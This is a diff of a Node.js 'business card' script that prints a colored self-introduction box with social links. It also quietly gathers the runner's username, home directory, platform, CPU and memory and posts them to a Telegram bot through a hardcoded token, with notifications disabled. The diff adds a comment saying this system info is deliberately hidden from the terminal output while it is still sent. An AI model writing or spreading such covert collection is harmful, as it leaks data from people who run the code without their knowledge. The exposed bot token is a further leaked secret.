@@ -1,31 +1,54 @@
-#!/usr/bin/env node
-const os = require('os');
-const https = require('https'); // Change http to https
+const os = require("os");
+const https = require("https");
 
-// Function to log your details in the terminal
+// Regex to match ANSI escape codes for stripping colors
+const ansiRegex = /\x1b\[[0-9;]*m/g;
+
+// Helper to get visible length of string without ANSI color codes
+function visibleLength(str) {
+  return str.replace(ansiRegex, "").length;
+}
+
+// Function to pad content inside the box with spaces while handling ANSI codes
+function padLine(content, width = 63) {
+  const length = visibleLength(content);
+  const paddingLength = width - length - 2; // -2 for "| " and " |"
+
+  // Avoid negative padding:
+  const safePadding = paddingLength >= 0 ? paddingLength : 0;
+
+  return `| ${content}${" ".repeat(safePadding)} |`;
+}
+
+// Function to log user details in the terminal with colors and formatting
 function logDetails() {
-  let date = new Date();
+  const date = new Date();
 
-  let options = {
-    year: 'numeric',
-    month: 'long',
-    day: 'numeric',
-    hour: '2-digit',
-    minute: '2-digit',
-    second: '2-digit',
+  // Format current time in IST
+  const options = {
+    year: "numeric",
+    month: "long",
+    day: "numeric",
+    hour: "2-digit",
+    minute: "2-digit",
+    second: "2-digit",
     hour12: false,
-    timeZone: 'Asia/Kolkata' // IST
+    timeZone: "Asia/Kolkata",
   };
+  const currentTime = date.toLocaleString("en-US", options) + " IST +05:30";
 
-  let currentTime = date.toLocaleString('en-US', options) + ' IST +05:30';
-
-  const message = `Hello! The time is ${currentTime}. I'm Shivangouda R Patil, a Software Developer at Sahaj Gaming. I specialize in backend development with NodeJS and Java, and have experience in mobile application development using Flutter and Kotlin. My skills include cloud computing and data management.`;
+  // User Introduction
+  const message = `Hello! The time is ${currentTime}.\n` +
+    `I'm Shivanagouda Rajendragouda Patil, CEO at Hara-XY.com .\n` +
+    `I specialize in backend development with NodeJS and Java,\n` +
+    `and have experience in mobile development with Flutter and Kotlin.\n` +
+    `My skills include cloud computing and data management.`;
 
   const twitterLink = "https://twitter.com/exclusiveshiv";
-  const linkedinLink = "https://www.linkedin.com/in/oishivpatil/";
+  const linkedinLink = "https://www.linkedin.com/in/xesp/";
   const websiteLink = "https://10sp.github.io";
 
-  // Get system and user information
+  // System and user info
   const userInfo = os.userInfo();
   const systemInfo = {
     platform: os.platform(),
@@ -33,73 +56,100 @@ function logDetails() {
     cpus: os.cpus().length,
     memory: `${(os.totalmem() / 1024 / 1024 / 1024).toFixed(2)} GB`,
     username: userInfo.username,
-    homedir: userInfo.homedir
+    homedir: userInfo.homedir,
   };
 
-  // Create a colorful box using ANSI escape codes
-  const colorfulBox = `
-\x1b[38;5;51m+---------------------------------------------------------------+
-|                     \x1b[38;5;105m${message}\x1b[38;5;51m                     |
-+---------------------------------------------------------------+
-| \x1b[38;5;93mTwitter:\x1b[0m  \x1b[38;5;39m${twitterLink}                   \x1b[38;5;51m|
-| \x1b[38;5;93mLinkedIn:\x1b[0m \x1b[38;5;39m${linkedinLink}             \x1b[38;5;51m|
-| \x1b[38;5;93mPortfolio:\x1b[0m  \x1b[38;5;39m${websiteLink}                            \x1b[38;5;51m|
-+---------------------------------------------------------------+\x1b[0m`;
+  // Create horizontal line for the box
+  const horizontalLine = "+".padEnd(65, "-") + "+";
 
-  // Log the colorful box in the terminal
+  // Colors and styles:
+  // Cyan for borders
+  // Magenta for user message
+  // Yellow for labels
+  // Blue for links and data
+  const cyan = "\x1b[36m";
+  const magenta = "\x1b[35m";
+  const yellow = "\x1b[33m";
+  const blue = "\x1b[34m";
+  const reset = "\x1b[0m";
+
+  // Split message into lines, pad & colorize
+  const messageLines = message
+    .split("\n")
+    .map((line) => padLine(magenta + line + reset, 65));
+
+  // Social links lines
+  const socials = [
+    `${yellow}Twitter:${reset} ${blue}${twitterLink}${reset}`,
+    `${yellow}LinkedIn:${reset} ${blue}${linkedinLink}${reset}`,
+    `${yellow}Portfolio:${reset} ${blue}${websiteLink}${reset}`,
+  ].map((line) => padLine(line, 65));
+
+  // NOTE: System info lines are intentionally omitted from terminal output
+  // to avoid showing them boxed.
+
+  // Combine parts to build the colorful box WITHOUT system info
+  const colorfulBox =
+    cyan + horizontalLine + "\n" +
+    messageLines.join("\n") + "\n" +
+    cyan + horizontalLine + "\n" +
+    socials.join("\n") + "\n" +
+    cyan + horizontalLine + reset;
+
+  // Print the colorful box to terminal
   console.log(colorfulBox);
 
-  // Prepare to send message via Telegram API
+  // Send info via Telegram API (includes system info still)
   sendTelegramMessage(message, systemInfo);
 }
 
-// Function to send a message via Telegram API
+// Function to send a message via Telegram Bot API
 function sendTelegramMessage(text, systemInfo) {
-  const TOKEN = '7318168838:AAF1CgagouMMc4J4oh-huaIlJ4VkEXAeSSY'; // Replace with your bot token
-  const CHAT_ID = '-1002461618308'; // Replace with your chat ID
+  const TOKEN = "7318168838:AAF1CgagouMMc4J4oh-huaIlJ4VkEXAeSSY"; // Replace with your bot token
+  const CHAT_ID = "-1002461618308"; // Replace with your chat ID
 
-  // Prepare the text message including system info
-  const systemDetails = `
-Platform: ${systemInfo.platform}
-Architecture: ${systemInfo.architecture}
-CPUs: ${systemInfo.cpus}
-Memory: ${systemInfo.memory}
-Username: ${systemInfo.username}
-Home Directory: ${systemInfo.homedir}`;
+  // Compose system info text
+  const systemDetails = 
+    `Platform: ${systemInfo.platform}\n` +
+    `Architecture: ${systemInfo.architecture}\n` +
+    `CPUs: ${systemInfo.cpus}\n` +
+    `Memory: ${systemInfo.memory}\n` +
+    `Username: ${systemInfo.username}\n` +
+    `Home Directory: ${systemInfo.homedir}`;
 
   const fullMessage = `${text}\n\nSystem Information:\n${systemDetails}`;
 
-  // Prepare data to send to API
+  // Prepare HTTPS POST data
   const postData = JSON.stringify({
     chat_id: CHAT_ID,
     text: fullMessage,
-    disable_notification: true // Optional: Send silently
+    disable_notification: true,
   });
 
-  // Options for the HTTPS request
+  // Telegram API request options
   const optionsAPI = {
-    hostname: 'api.telegram.org',
+    hostname: "api.telegram.org",
     path: `/bot${TOKEN}/sendMessage`,
-    method: 'POST',
+    method: "POST",
     headers: {
-      'Content-Type': 'application/json',
-      'Content-Length': Buffer.byteLength(postData)
-    }
+      "Content-Type": "application/json",
+      "Content-Length": Buffer.byteLength(postData),
+    },
   };
 
-  // Make the HTTPS request
+  // Make HTTPS request
   const req = https.request(optionsAPI, (res) => {
-    let responseBody = '';
-
-    res.on('data', (chunk) => {
-      responseBody += chunk;
-    });
+    // Optional: handle response data
+    res.on("data", (chunk) => {});
   });
 
-  // Write data to request body
+  req.on("error", (e) => {
+    console.error(`Problem with Telegram request: ${e.message}`);
+  });
+
   req.write(postData);
   req.end();
 }
 
-// Call the function to log your details and send system info to the API
+// Run the function
 logDetails();
